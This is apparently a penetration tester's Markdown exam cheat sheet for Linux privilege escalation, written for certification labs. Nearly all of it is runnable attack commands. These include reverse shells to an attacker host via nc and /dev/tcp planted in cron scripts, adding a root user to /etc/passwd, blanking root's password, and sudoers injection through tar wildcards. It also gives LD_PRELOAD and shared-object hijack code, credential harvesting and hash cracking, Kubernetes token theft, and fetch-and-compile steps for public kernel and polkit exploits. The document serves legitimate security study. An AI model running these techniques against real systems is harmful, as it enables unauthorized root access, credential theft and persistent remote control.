# 04 — PRIVESC · Linux

> Goal: turn a **low-priv Linux shell** into root (or a higher user, then re-run this file as them).
> Every checklist point carries **its own command, from your CPTS notes**. Tick as you go.
> `export IP=...` · `export ATTACKER=$(ip -4 a show tun0 | grep -oP '(?<=inet )[\d.]+')` first.
> Order = simplest-first: enum → creds → sudo/SUID/cap/group quick wins → misconfig → container/CVE → kernel LAST.

> **Golden rule:** misconfig before kernel. Run `sudo -l` + the SUID find on *every* shell and *every* user you pivot to — the path is almost always a misconfiguration, not a 0-day. Re-enumerate after every lateral move; the next user has different groups/sudo. Kernel/polkit CVEs are noisy and crash-prone — last resort only.

---

## 🔹 Situational awareness  (run on EVERY shell — screenshot the first five)

- [ ] **The first five** — `whoami; id; hostname; ip a | grep inet; sudo -l 2>/dev/null`
- [ ] **Distro + kernel** (note for CVE matching) — `cat /etc/os-release; uname -a`
- [ ] **PATH + env** (writable / `.` entry → PATH abuse; leaked creds; `env_keep`) — `echo $PATH; env`
- [ ] **Real users + your groups** — `grep "sh$" /etc/passwd` · `cat /etc/group; getent group sudo`
- [ ] **SUID + capabilities sweep (one shot)** —
  ```bash
  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
  find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
  ```
- [ ] **Pivot recon** (extra NIC = pivot; internal DNS = AD) — `ip a; route; arp -a; cat /etc/resolv.conf`
- [ ] **Mounts / scratch** — `lsblk; cat /etc/fstab; df -h` · `ls -l /tmp /var/tmp /dev/shm`
- [ ] **Auto-enum + live cron watch** — `./linpeas.sh` · `./pspy64 -pf -i 1000`

📓 `[[../linux-privallege-escalation/00-METHODOLOGY]]` · `[[../linux-privallege-escalation/02_environment_enumeration]]` · `[[../linux-privallege-escalation/03_services_internals_enumeration]]`

---

## 🔹 Upgrade the shell FIRST  (a dumb shell silently kills sudo / pager escapes)

- [ ] **Full TTY** — `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`
- [ ] No Python → walk the fallback list (perl/ruby/awk/`script`) — full list in `[[03-EXPLOITATION-SERVICES]]` §TTY
- [ ] `sudo -l` / `vi`/`busctl` pager escapes fail on a no-PTY shell — **upgrade before** Phase 6 CVEs, not after

📓 `[[../shells-payloads/11-spawning-interactive-shells]]` (cross-phase — same step as `[[03-EXPLOITATION-SERVICES]]`)

---

## 🔹 Credential hunting & reuse  (always — run in parallel; search before you exploit)

- [ ] **bash_history** (`sshpass -p`, `mysql -p`, `curl -u`) — `tail -n50 /home/*/.bash_history /root/.bash_history 2>/dev/null`
- [ ] **Broad cred grep** — `grep -riE 'pass|cred|secret|token' /home/ /etc/ /var/www/ 2>/dev/null | grep -v Binary`
- [ ] **SSH keys + targets** — `find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null` · `cat ~/.ssh/known_hosts`
- [ ] **Configs / backups / DBs** (creds live in `.bak`/`.old`, not the live file) —
  ```bash
  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
  find / -name "*.bak" -o -name "*.old" -o -name "*.db" -o -name "*.sql" 2>/dev/null
  ```
- [ ] **Cron scripts + mail spools** — `cat /etc/crontab; ls -la /etc/cron.*/; crontab -l` · `ls -la /var/mail/ /var/spool/mail/ 2>/dev/null`
- [ ] **Root-only harvest** — `sudo python3 mimipenguin.py` · `python3.9 firefox_decrypt.py` · `cat /etc/security/opasswd` (old pwd → pattern)
- [ ] **Shadow crack** (root) — `unshadow /etc/passwd /etc/shadow > u.hashes` →
  ```bash
  john --single u.hashes                       # GECOS — criminally underused, run FIRST
  john --wordlist=/usr/share/wordlists/rockyou.txt u.hashes
  hashcat -m 1800 u.hashes /usr/share/wordlists/rockyou.txt   # sha512crypt $6$
  ```
- [ ] **Reuse:** spray every found password against every user — `su <user>` → on success **re-run *Situational awareness* as them**

📓 `[[../linux-privallege-escalation/04_credential_hunting]]` · `[[../password-attacks/17-credential-hunting-in-linux]]` · `[[../password-attacks/16-linux-authentication-process]]` · `[[../password-attacks/00-METHODOLOGY]]`

---

## 🔹 Sudo rights abuse  (check FIRST — highest EV, GTFOBins routes almost everything)

- [ ] **List rights** — `sudo -l`
- [ ] **NOPASSWD binary → GTFOBins** (gtfobins.github.io → sudo section) — e.g. `sudo /usr/bin/openssl ...` (file read / shell)
- [ ] **tcpdump → root** (`-z` runs a script as root) —
  ```bash
  # /tmp/.t = chmod +x with: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER 443 >/tmp/f
  sudo /usr/sbin/tcpdump -ln -i $IFACE -w /dev/null -W 1 -G 1 -z /tmp/.t -Z root
  ```
- [ ] `env_keep+=LD_PRELOAD` → *LD_PRELOAD injection* block · `SETENV` + python script → *Python library hijacking* M3
- [ ] **Gate the CVEs** — `sudo -V | head -1` → `(ALL,!root)` + `<1.8.28` → CVE-2019-14287 · `1.8.31`/`1.9.2` → Baron Samedit (*Sudo & polkit CVEs*)

📓 `[[../linux-privallege-escalation/09-sudo-rights-abuse]]` · `[[../linux-privallege-escalation/01-intro]]`

---

## 🔹 Writable /etc/passwd  (instant, guaranteed root)

- [ ] **Check** — `ls -l /etc/passwd` (world-writable?)
- [ ] **Add a root-UID user and `su`** —
  ```bash
  echo "r00t:$(openssl passwd -1 Pass123):0:0::/root:/bin/bash" >> /etc/passwd && su r00t   # Pass123
  ```

📓 `[[../linux-privallege-escalation/04_credential_hunting]]` · methodology Phase 3 `[[../linux-privallege-escalation/00-METHODOLOGY]]`

---

## 🔹 SUID / SGID binaries  (GTFOBins, or shared-object hijack if custom)

- [ ] **SUID list** — `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
- [ ] **SGID list** — `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`
- [ ] **Standard binary** → GTFOBins → **limited-SUID** section (the SUID one, not sudo)
- [ ] **Custom binary, no GTFOBins entry** — `readelf -d $SUID_BIN | grep PATH` → *Shared object hijacking* block
- [ ] Always spawn with **`/bin/sh -p`** (or `bash -p`) — plain shell from SUID context drops privileges

📓 `[[../linux-privallege-escalation/08-special-permissions]]`
<details><summary>▸ lab refs</summary>`[[../linux-privallege-escalation/28-skills-assessment]]` — hidden `.flag` → bash_history → adm → Tomcat WAR → sudo busctl chain</details>

---

## 🔹 Capabilities  (cap_setuid / cap_dac_override on a binary)

- [ ] **Enumerate** — `getcap -r / 2>/dev/null` (or the targeted `find … -exec getcap`)
- [ ] **cap_dac_override on vim → blank root's password** —
  ```bash
  echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
  su root                                      # no password now
  ```
- [ ] **cap_setuid on python** — `./python -c 'import os;os.setuid(0);os.system("/bin/sh")'`

📓 `[[../linux-privallege-escalation/11-capabilities]]`

---

## 🔹 Privileged groups  (lxd / docker / disk / adm — check `id`)

- [ ] **lxd** —
  ```bash
  lxc image import alpine.tar.gz --alias alpine          # transfer builder if needed
  lxc init alpine r00t -c security.privileged=true
  lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
  lxc start r00t; lxc exec r00t /bin/sh                  # host fs in /mnt/root
  ```
- [ ] **docker group** — `docker run -v /:/mnt --rm -it $IMG chroot /mnt bash`
- [ ] **writable docker.sock** — `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it $IMG chroot /mnt bash`
- [ ] **disk** — `debugfs /dev/sda1` → `cat /root/.ssh/id_rsa` / `cat /root/root.txt`
- [ ] **adm** — `grep -rw "flag\|password" /var/log 2>/dev/null`

📓 `[[../linux-privallege-escalation/10-privileged-groups]]` · `[[../linux-privallege-escalation/14-lxd]]` · `[[../linux-privallege-escalation/15-docker]]`

---

## 🔹 Cron job abuse  (writable script run by root — APPEND, never overwrite)

- [ ] **Find writable + list cron** — `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` · `ls -la /etc/cron.* /etc/cron.d/; crontab -l; cat /etc/crontab`
- [ ] **Confirm it fires** — `./pspy64 -pf -i 1000`
- [ ] **Listener BEFORE the cron fires** — `sudo nc -nvlp 443`
- [ ] **Append a reverse shell** (`>>`, never `>`) — `echo 'bash -i >& /dev/tcp/$ATTACKER/443 0>&1' >> $WRITABLE_CRON_SCRIPT`

📓 `[[../linux-privallege-escalation/13-cron-job-abuse]]` · `[[../linux-privallege-escalation/03_services_internals_enumeration]]`

---

## 🔹 PATH abuse  (root script/SUID calls a command by relative name)

- [ ] **Spot it** — `echo $PATH` (non-default / writable / `.` entry)
- [ ] **Prepend `.` and plant the binary** —
  ```bash
  PATH=.:${PATH}; export PATH
  echo '/bin/bash -p' > $RELATIVE_CMD; chmod +x $RELATIVE_CMD   # then trigger the privileged caller
  ```

📓 `[[../linux-privallege-escalation/05_path_abuse]]`

---

## 🔹 Wildcard abuse  (root cron/script runs `tar *` in a dir you can write)

- [ ] **Plant payload + checkpoint args** —
  ```bash
  echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
  touch -- "--checkpoint=1"
  touch -- "--checkpoint-action=exec=sh root.sh"
  ```
- [ ] Wait for cron → `sudo su` (`touch --` is mandatory so the shell doesn't parse the flag-named files)

📓 `[[../linux-privallege-escalation/06-wildcard-abuse]]`

---

## 🔹 Restricted shell escape  (prompt is rbash/rksh — `echo $0; echo $SHELL`)

- [ ] **SSH-time escape** — `ssh $USER@$IP -t "bash --noprofile"` (Ctrl+C if it hangs)
- [ ] **In-shell, if a binary is allowed** —
  ```bash
  vi → :set shell=/bin/bash → :shell
  awk 'BEGIN{system("/bin/sh")}' ; find / -exec /bin/bash \; ; python -c 'import os;os.system("/bin/sh")'
  ```
- [ ] Escaped → re-run *Situational awareness* (you were jailed, not unprivileged)

📓 `[[../linux-privallege-escalation/07-scaping-restricted-shells]]`

---

## 🔹 LD_PRELOAD injection  (`sudo -l` shows `env_keep+=LD_PRELOAD`)

- [ ] **Build the `.so`** (`unsetenv` + `-nostartfiles` are mandatory) —
  ```c
  // /tmp/root.c
  #include <stdlib.h>
  void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
  ```
  ```bash
  gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
  sudo LD_PRELOAD=/tmp/root.so $ANY_SUDO_ALLOWED_BINARY        # → root bash
  ```

📓 `[[../linux-privallege-escalation/20-shared-libraries-ld-preload]]`

---

## 🔹 Shared object hijacking  (SUID binary with writable RUNPATH / missing `.so`)

- [ ] **Find the hijackable lib** — `readelf -d $SUID_BIN | grep PATH` (RUNPATH → writable dir?) · `ldd $SUID_BIN`
- [ ] **Implement the EXACT undefined symbol the binary needs** —
  ```bash
  # void dbquery(){ setuid(0); system("/bin/sh -p"); }   ← name must match the missing symbol
  gcc /tmp/src.c -fPIC -shared -o $RUNPATH/lib<name>.so
  $SUID_BIN
  ```

📓 `[[../linux-privallege-escalation/21-shared-object-hijacking]]`

---

## 🔹 Python library hijacking  (SUID / sudo python script imports an influenceable module)

- [ ] **Writable module file** — inject `import os;os.system("/bin/bash")` into the imported function
- [ ] **Higher-priority sys.path dir writable** —
  ```bash
  python3 -c 'import sys;print("\n".join(sys.path))'
  echo -e 'import os\ndef virtual_memory():\n os.system("/bin/bash")' > $HIGHPRIO/psutil.py
  sudo /usr/bin/python3 $SCRIPT
  ```
- [ ] **sudo has SETENV** — `sudo PYTHONPATH=/tmp/ /usr/bin/python3 $SCRIPT` (with `/tmp/psutil.py`)

📓 `[[../linux-privallege-escalation/22-python-library-hijacking]]`

---

## 🔹 Service / mount escapes  (NFS · tmux · vulnerable SUID service)

- [ ] **NFS `no_root_squash`** — `showmount -e $IP` → on **attacker (root)**:
  ```bash
  sudo mount -t nfs $IP:/share /mnt
  gcc shell.c -o /mnt/shell      # shell.c: setuid(0);setgid(0);system("/bin/bash")
  chmod u+s /mnt/shell
  # on target as low-priv:  /share/shell -p
  ```
- [ ] **Tmux session hijack** (root tmux, group-readable socket) — `ps aux | grep tmux; ls -la $SOCKET` → `tmux -S $SOCKET`
- [ ] **Outdated SUID service** (e.g. GNU Screen 4.5.0) — `screen -v; searchsploit "GNU Screen 4.5.0"` → `searchsploit -m linux/local/41154.sh` → `chmod +x 41154.sh; ./41154.sh`

📓 `[[../linux-privallege-escalation/18-miscellaneous-techniques]]` · `[[../linux-privallege-escalation/12-vulnerable-services]]`

---

## 🔹 Kubernetes  (node port 10250 reachable & anonymous)

- [ ] **Enumerate + RCE-scan** — `kubeletctl -i --server $IP pods` · `kubeletctl -i --server $IP scan rce`
- [ ] **Steal the SA token + CA** —
  ```bash
  kubeletctl -i --server $IP exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p $POD -c $CON | tee k8.token
  kubeletctl --server $IP exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p $POD -c $CON | tee ca.crt
  export token=$(cat k8.token)
  ```
- [ ] **Abuse the API → hostPath pod** —
  ```bash
  kubectl --token=$token --certificate-authority=ca.crt --server=https://$IP:6443 auth can-i --list
  kubectl --token=$token --certificate-authority=ca.crt --server=https://$IP:6443 apply -f privesc.yaml
  kubeletctl --server $IP exec "cat /root/etc/shadow" -p privesc -c privesc
  ```

📓 `[[../linux-privallege-escalation/16-kubernetes]]`

---

## 🔹 Sudo & polkit CVEs  (version-gated — verify the precondition first)

- [ ] **CVE-2019-14287** (sudo <1.8.28 **and** sudoers `(ALL, !root)`) — `sudo -u#-1 $ALLOWED_BIN` → escape pager (`b` / `!/bin/bash`)
- [ ] **CVE-2021-3156 Baron Samedit** (sudo 1.8.31 / 1.8.27 / 1.9.2, `gcc`+`make` on target) —
  ```bash
  git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich
  ```
- [ ] **CVE-2021-4034 PwnKit** (any unpatched polkit pre-Jan-2022, `gcc` on target — **no sudo/PAM config needed, highest EV on an old box**) —
  ```bash
  git clone https://github.com/arthepsy/CVE-2021-4034.git
  cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc && ./poc
  ```

📓 `[[../linux-privallege-escalation/23-sudo]]` · `[[../linux-privallege-escalation/24-polkit]]`

---

## 🔹 Kernel CVEs  (LAST resort — noisy, can panic the box; confirm a snapshot exists)

- [ ] **Match the kernel** — `uname -r; cat /etc/lsb-release`
- [ ] **CVE-2021-3493 OverlayFS** (Ubuntu 5.x unpatched — most reliable, prefer this) —
  ```bash
  wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O o.c && gcc o.c -o o && ./o
  ```
- [ ] **CVE-2022-0847 Dirty Pipe** (kernel 5.8–5.17) —
  ```bash
  git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
  cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh && ./exploit-1
  ```
- [ ] **netfilter** (only if above fail — crash-prone) — `CVE-2021-22555` (2.6–5.11) · `CVE-2022-25636` (5.4–5.6.10) · `CVE-2023-32233` (≤6.3.1)

📓 `[[../linux-privallege-escalation/19-kernel-exploits]]` · `[[../linux-privallege-escalation/25-dirty-pipe]]` · `[[../linux-privallege-escalation/26-netfilter]]`
<details><summary>▸ lab refs</summary>`[[../linux-privallege-escalation/28-skills-assessment]]` · `[[../password-attacks/26-skills-assessment]]` — full chains incl. shadow crack + reuse pivots</details>

---

## ⚠️ Gotchas — exam-time time-killers

- **Misconfig before kernel.** The exam path is nearly always sudo/SUID/cron/cap/group. Don't burn 40 min compiling a netfilter PoC before running `sudo -l`.
- **Dumb shell kills `sudo` + pager escapes.** WAR/web reverse shell has no TTY → `sudo`, `vi`/`busctl` escapes fail silently. Upgrade (`pty.spawn`) **first** — #1 Skills-Assessment foot-gun.
- **Cron: `>>` not `>`, listener BEFORE it fires.** Overwriting breaks the legit job and the privesc; a late listener misses the callback.
- **Re-enumerate after every pivot.** New user = different `id`/`sudo -l`/groups/readable files. Re-run the whole tree as them; `su` every found password everywhere (reuse is the #1 lateral path).
- **`ls` ≠ `ls -lA`.** Hidden dotfiles (and dotfiles inside dotdirs) hide flags/creds. Creds live in `.bak`/`.old`, not the live config.
- **`/bin/sh -p` (or `bash -p`) preserves SUID.** Plain `/bin/bash` from a SUID/cap context drops privileges.
- **LD_PRELOAD `.so` needs `unsetenv("LD_PRELOAD")` + `-nostartfiles`** — without them it recurses or won't load via `_init`.
- **Shared-object hijack: implement the EXACT missing symbol** (`ldd`/run to learn it). RUNPATH ≠ RPATH — check `readelf -d`.
- **CVE-2019-14287 needs the `(ALL, !root)` form** — not generic NOPASSWD. Baron Samedit / kernel PoCs need `gcc`/`make` on target (else cross-compile or pick PwnKit).
- **Don't crack slow hashes on the clock.** `$2*`/`$y$`/`$6$` from `/etc/shadow` are report-only — `john --single` is the fast win; otherwise reuse plaintext you already found.
- **Document the chain.** Record `user:pass@host (source)` and every escalation step — the exam grades the path, not the box.

---

## ➡️ Where next

- Got root → loot for lateral (shadow / SSH keys / keytabs / ccache) then → `[[06-LATERAL]]`
- Found creds / a new user, more hosts behind this one / domain in scope → `[[06-LATERAL]]`
- It's a Windows host, not Linux → `[[05-PRIVESC-WINDOWS]]`
- Need a stable shell / better TTY first → `[[03-EXPLOITATION-SERVICES]]`
- Need ports/versions or a way in first → `[[01-ENUMERATION]]` · `[[02-EXPLOITATION-WEB]]`
- **Confirmed ANY finding (root, cred, misconfig) → log it NOW** → `[[07-REPORT]]`
- Symptom lookup → `[[../ATTACK-PATHS]]` · macro time-boxing → `[[../00-EXAM-MASTER]]`
